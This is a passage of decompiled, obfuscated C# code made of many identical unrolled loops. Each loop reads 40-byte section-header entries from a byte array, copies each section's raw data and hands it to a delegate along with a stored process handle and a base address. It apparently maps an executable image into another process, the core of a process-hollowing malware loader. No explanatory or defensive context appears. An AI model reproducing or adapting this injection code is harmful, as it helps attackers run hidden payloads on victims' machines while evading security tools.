						*unchecked((int*)((byte*)ptr + 2472)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2476)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2480)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4216] = ((*(int*)((byte*)ptr + 2476) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4216] != 0)
					{
						byte[] array205;
						checked
						{
							array205 = new byte[*unchecked((int*)((byte*)ptr + 2476)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2480), array205, 0, array205.Length);
						((byte*)ptr)[4217] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2472))), array205, array205.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4217] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4221] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4221] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2484)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2488)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2492)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4219] = ((*(int*)((byte*)ptr + 2488) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4219] != 0)
					{
						byte[] array206;
						checked
						{
							array206 = new byte[*unchecked((int*)((byte*)ptr + 2488)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2492), array206, 0, array206.Length);
						((byte*)ptr)[4220] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2484))), array206, array206.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4220] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4224] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4224] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2496)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2500)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2504)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4222] = ((*(int*)((byte*)ptr + 2500) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4222] != 0)
					{
						byte[] array207;
						checked
						{
							array207 = new byte[*unchecked((int*)((byte*)ptr + 2500)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2504), array207, 0, array207.Length);
						((byte*)ptr)[4223] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2496))), array207, array207.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4223] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4227] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4227] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2508)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2512)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2516)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4225] = ((*(int*)((byte*)ptr + 2512) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4225] != 0)
					{
						byte[] array208;
						checked
						{
							array208 = new byte[*unchecked((int*)((byte*)ptr + 2512)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2516), array208, 0, array208.Length);
						((byte*)ptr)[4226] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2508))), array208, array208.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4226] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4230] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4230] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2520)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2524)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2528)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4228] = ((*(int*)((byte*)ptr + 2524) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4228] != 0)
					{
						byte[] array209;
						checked
						{
							array209 = new byte[*unchecked((int*)((byte*)ptr + 2524)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2528), array209, 0, array209.Length);
						((byte*)ptr)[4229] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2520))), array209, array209.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4229] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4233] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4233] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2532)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2536)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2540)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4231] = ((*(int*)((byte*)ptr + 2536) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4231] != 0)
					{
						byte[] array210;
						checked
						{
							array210 = new byte[*unchecked((int*)((byte*)ptr + 2536)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2540), array210, 0, array210.Length);
						((byte*)ptr)[4232] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2532))), array210, array210.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4232] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4236] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4236] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2544)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2548)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2552)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4234] = ((*(int*)((byte*)ptr + 2548) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4234] != 0)
					{
						byte[] array211;
						checked
						{
							array211 = new byte[*unchecked((int*)((byte*)ptr + 2548)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2552), array211, 0, array211.Length);
						((byte*)ptr)[4235] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2544))), array211, array211.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4235] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4239] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4239] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2556)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2560)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2564)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4237] = ((*(int*)((byte*)ptr + 2560) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4237] != 0)
					{
						byte[] array212;
						checked
						{
							array212 = new byte[*unchecked((int*)((byte*)ptr + 2560)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2564), array212, 0, array212.Length);
						((byte*)ptr)[4238] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2556))), array212, array212.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4238] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4242] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4242] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2568)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2572)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2576)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4240] = ((*(int*)((byte*)ptr + 2572) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4240] != 0)
					{
						byte[] array213;
						checked
						{
							array213 = new byte[*unchecked((int*)((byte*)ptr + 2572)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2576), array213, 0, array213.Length);
						((byte*)ptr)[4241] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2568))), array213, array213.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4241] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4245] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4245] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2580)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2584)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2588)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4243] = ((*(int*)((byte*)ptr + 2584) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4243] != 0)
					{
						byte[] array214;
						checked
						{
							array214 = new byte[*unchecked((int*)((byte*)ptr + 2584)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2588), array214, 0, array214.Length);
						((byte*)ptr)[4244] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2580))), array214, array214.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4244] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4248] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4248] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2592)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2596)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2600)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4246] = ((*(int*)((byte*)ptr + 2596) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4246] != 0)
					{
						byte[] array215;
						checked
						{
							array215 = new byte[*unchecked((int*)((byte*)ptr + 2596)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2600), array215, 0, array215.Length);
						((byte*)ptr)[4247] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2592))), array215, array215.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4247] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4251] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4251] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2604)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2608)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2612)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4249] = ((*(int*)((byte*)ptr + 2608) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4249] != 0)
					{
						byte[] array216;
						checked
						{
							array216 = new byte[*unchecked((int*)((byte*)ptr + 2608)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2612), array216, 0, array216.Length);
						((byte*)ptr)[4250] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2604))), array216, array216.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4250] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4254] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4254] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2616)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2620)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2624)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4252] = ((*(int*)((byte*)ptr + 2620) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4252] != 0)
					{
						byte[] array217;
						checked
						{
							array217 = new byte[*unchecked((int*)((byte*)ptr + 2620)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2624), array217, 0, array217.Length);
						((byte*)ptr)[4253] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2616))), array217, array217.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4253] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4257] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4257] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2628)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2632)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2636)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4255] = ((*(int*)((byte*)ptr + 2632) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4255] != 0)
					{
						byte[] array218;
						checked
						{
							array218 = new byte[*unchecked((int*)((byte*)ptr + 2632)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2636), array218, 0, array218.Length);
						((byte*)ptr)[4256] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2628))), array218, array218.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4256] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4260] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4260] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2640)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2644)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2648)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4258] = ((*(int*)((byte*)ptr + 2644) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4258] != 0)
					{
						byte[] array219;
						checked
						{
							array219 = new byte[*unchecked((int*)((byte*)ptr + 2644)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2648), array219, 0, array219.Length);
						((byte*)ptr)[4259] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2640))), array219, array219.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4259] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4263] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4263] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2652)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2656)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2660)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4261] = ((*(int*)((byte*)ptr + 2656) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4261] != 0)
					{
						byte[] array220;
						checked
						{
							array220 = new byte[*unchecked((int*)((byte*)ptr + 2656)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2660), array220, 0, array220.Length);
						((byte*)ptr)[4262] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2652))), array220, array220.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4262] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4266] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4266] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2664)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2668)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2672)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4264] = ((*(int*)((byte*)ptr + 2668) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4264] != 0)
					{
						byte[] array221;
						checked
						{
							array221 = new byte[*unchecked((int*)((byte*)ptr + 2668)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2672), array221, 0, array221.Length);
						((byte*)ptr)[4265] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2664))), array221, array221.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4265] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4269] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4269] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2676)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2680)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2684)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4267] = ((*(int*)((byte*)ptr + 2680) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4267] != 0)
					{
						byte[] array222;
						checked
						{
							array222 = new byte[*unchecked((int*)((byte*)ptr + 2680)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2684), array222, 0, array222.Length);
						((byte*)ptr)[4268] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2676))), array222, array222.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4268] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4272] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4272] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2688)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2692)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2696)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[4270] = ((*(int*)((byte*)ptr + 2692) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4270] != 0)
					{
						byte[] array223;
						checked
						{
							array223 = new byte[*unchecked((int*)((byte*)ptr + 2692)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 2696), array223, 0, array223.Length);
						((byte*)ptr)[4271] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 2688))), array223, array223.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[4271] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[4275] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[4275] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 2700)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 2704)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 2708)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
